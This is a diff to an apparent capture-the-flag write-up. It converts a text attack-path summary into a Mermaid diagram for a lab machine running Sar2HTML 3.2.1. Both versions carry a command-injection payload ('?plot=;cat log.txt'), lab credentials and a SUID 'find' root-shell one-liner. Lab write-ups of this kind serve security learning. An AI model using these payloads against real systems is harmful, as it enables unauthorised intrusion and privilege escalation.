@@ -17,26 +17,21 @@ End-to-end compromise: from Nmap scan → user flag → root flag, with full doc
 
 ### Attack Path (Summary)
 
-```text
-Nmap: 21/FTP, 80/HTTP, 10000/Webmin, 55007/SSH
-  ↓
-Anon FTP → .info.txt (ROT13 red herring)
-  ↓
-Gobuster → /joomla → /joomla/_test (Sar2HTML 3.2.1)
-  ↓
-RCE via ?plot=;cat log.txt → creds: basterd / superduperp@$$
-  ↓
-SSH to basterd@target:55007
-  ↓
-cat backup.sh → creds: stoner / superduperp@$$no1knows
-  ↓
-su stoner → user flag (/home/stoner/.secret)
-  ↓
-find / -perm -4000 → /usr/bin/find has SUID
-  ↓
-find . -exec /bin/sh -p → root
-  ↓
-cat /root/root.txt → root flag
+```mermaid
+graph TD
+    Nmap["Nmap scan → 21/FTP, 80/HTTP,<br/>10000/Webmin, 55007/SSH"] --> FTP["FTP anonymous login"]
+    FTP --> Herring[".info.txt → ROT13 red herring"]
+    Nmap --> Gobuster["Gobuster → /joomla"]
+    Gobuster --> JoomScan["JoomScan enumeration"]
+    Gobuster --> Deeper["Gobuster deeper<br/>→ /joomla/_test"]
+    Deeper --> RCE["Sar2HTML 3.2.1 RCE<br/>?plot=;cat log.txt"]
+    RCE --> Creds1["Credentials: basterd / superduperp@$$"]
+    Creds1 --> SSH["SSH basterd@target:55007"]
+    SSH --> Backup["cat backup.sh<br/>→ creds: stoner / superduperp@$$no1knows"]
+    Backup --> Stoner["su stoner → user flag<br/>/home/stoner/.secret"]
+    Stoner --> SUID["find / -perm -4000<br/>→ /usr/bin/find has SUID"]
+    SUID --> Root["find . -exec /bin/sh -p → root"]
+    Root --> Flag["cat /root/root.txt → root flag"]
 ```
 
 ### Key Techniques Exercised
